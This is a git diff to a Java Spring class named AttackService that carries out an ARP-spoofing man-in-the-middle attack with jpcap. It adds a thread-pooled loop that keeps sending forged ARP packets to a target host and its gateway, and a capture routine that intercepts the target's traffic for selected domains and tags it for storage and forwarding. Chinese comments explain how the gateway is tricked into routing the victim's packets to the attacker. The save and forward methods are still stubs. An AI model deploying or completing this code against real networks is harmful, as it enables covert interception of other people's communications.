@@ -10,7 +10,10 @@ import jpcap.JpcapSender;
 import jpcap.NetworkInterface;
 import jpcap.packet.ARPPacket;
 import jpcap.packet.EthernetPacket;
+import jpcap.packet.IPPacket;
+import jpcap.packet.Packet;
 import org.slf4j.LoggerFactory;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Service;
 import org.springframework.util.StringUtils;
 
@@ -21,6 +24,10 @@ import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.util.Date;
 import java.util.Map;
+import java.util.Set;
+import java.util.concurrent.ArrayBlockingQueue;
+import java.util.concurrent.ThreadPoolExecutor;
+import java.util.concurrent.TimeUnit;
 
 /**
  * @author kol Huang
@@ -32,6 +39,9 @@ public class AttackService {
 
     @Resource
     RedisMapper redisMapper;
+
+    @Autowired
+    DmIpLookUpService dmIpLookUpService;
 
     private NetworkInterface[] devices;
 
@@ -56,6 +66,21 @@ public class AttackService {
 
     private Date startAttackTimeStamp;
     private Integer batchId;
+
+    //使用线程池
+    private static final int CORE_POOL_SIZE = 5;//核心线程数
+    private static final int MAXIMUM_POOL_SIZE = 10;//最大线程数
+    private static final long KEEP_ALIVE_TIME = 1L;//空闲保活时间
+    private static final TimeUnit UNIT = TimeUnit.MILLISECONDS;//时间单位
+    private static final int QUEUE_CAPACITY = 5;//任务队列最大长度
+    static ThreadPoolExecutor executor = new ThreadPoolExecutor(
+            CORE_POOL_SIZE,
+            MAXIMUM_POOL_SIZE,
+            KEEP_ALIVE_TIME,
+            UNIT,
+            new ArrayBlockingQueue<>(QUEUE_CAPACITY),//有界阻塞队列
+            new ThreadPoolExecutor.CallerRunsPolicy()//饱和策略选择调用线程帮忙的策略
+    );
 
 
     private long upStreamNum;
@@ -198,7 +223,12 @@ public class AttackService {
         //设置ARP包欺骗网关，假装自己是目标主机，因此源IP地址需要改成攻击目标的IP地址，但是MAC地址修改成本地主机的MAC地址
         //这样就能让网关认为本地主机的MAC地址是攻击目标的MAC地址，进而将需要发到目标主机的数据包通过ARP表发到本地主机的网卡上
         ARPPacket arpToGate = createARPPacket(srcMACBT, dstIPIA.getAddress(), gateMACBT, gateIPIA.getAddress());
+        //将域名映射为IP，按批次号存入redis中
+        dmIpLookUpService.ipLookUp(batchId,config.getFilterDomain());
 
+        //发包
+        sendPacket(arpToDst, arpToGate);
+        //收包并转发
 
     }
 
@@ -222,6 +252,104 @@ public class AttackService {
         //添加以太网首部
         arpPacket.datalink = ethernetPacket;
         return arpPacket;
+    }
+    //发送数据包
+    private void sendPacket(Packet packet1, Packet packet2){
+        Runnable task = new Runnable() {
+            @Override
+            public void run() {
+                while(attacking){
+                    try{
+                        if(sender != null && attacking){
+                            sender.sendPacket(packet1);
+                        }
+                        if(sender != null && attacking){
+                            sender.sendPacket(packet2);
+                        }
+                        //控制发包的速度
+                        Thread.sleep(500);
+                    } catch (Throwable e) {
+                        logger.error("Unknown error occur in send thread, ", e);
+                    }
+                }
+            }
+        };
+        executor.execute(task);
+    }
+    //接收并转发数据包
+    private void receiveAndForwardingPacket(){
+        Runnable task = new Runnable() {
+            @Override
+            public void run() {
+                while(attacking){
+                    try{
+                        //接收数据包
+                        Packet packet = captor.getPacket();
+                        if(packet != null && packet != Packet.EOF){
+                            //检查是否是IP包
+                            if(packet instanceof IPPacket){
+                                IPPacket ipPacket = (IPPacket) packet;
+                                //数据包属于filterDomain
+                                if(isRelatedToSpecificDomains(ipPacket.src_ip.getHostAddress())
+                                        || isRelatedToSpecificDomains(ipPacket.dst_ip.getHostAddress())){
+                                    //将数据包转发到目标主机并保存到数据库
+
+                                    //如果这个数据包的源IP地址是目标主机的IP地址，那么说明是上行链路的数据包
+                                    if(ipPacket.src_ip.getHostAddress().equals(config.getDestIp())){
+                                        //如果这个数据包的源MAC地址是本地主机的MAC地址，说明这是我自己发送的攻击数据包，需要忽略
+                                        if(packet.datalink instanceof EthernetPacket){
+                                            EthernetPacket eth = (EthernetPacket) packet.datalink;
+                                            String macFromCap = eth.getSourceAddress();
+                                            if(!macFromCap.equalsIgnoreCase(config.getSrcMac())){
+                                                savePacket(ipPacket, true);
+                                            }
+                                        }
+                                        forward(ipPacket, gateMACBT);
+                                    }
+                                    //如果这个数据包的目的IP地址是目标主机的IP地址，那么说明是下行链路的数据包
+                                    else if(ipPacket.dst_ip.getHostAddress().equals(config.getDestIp())){
+                                        savePacket(ipPacket, false);
+                                        forward(ipPacket, dstMACBT);
+                                    }
+                                }
+                            }
+
+                            //检查是否是ARP包
+                            if(packet instanceof ARPPacket){
+
+                            }
+                        }
+                    }catch (Throwable e){
+
+
+                    }
+                }
+            }
+        };
+        executor.execute(task);
+    }
+
+    private boolean isRelatedToSpecificDomains(String ip){
+        if(!StringUtils.hasLength(ip))  return false;
+
+        Set<String> validIps = dmIpLookUpService.getAllIps(batchId);
+
+        if(validIps.contains(ip))   return true;
+
+        return false;
+    }
+
+    private void savePacket(Packet packet, boolean isUpstream){
+        //TODO 保存数据包到redis
+    }
+
+    /**
+     * 修改数据包的以太网首部并转发数据包
+     * @param packet
+     * @param changeMAC
+     */
+    private void forward(Packet packet, byte[] changeMAC){
+        //TODO 转发数据包
     }
 
 
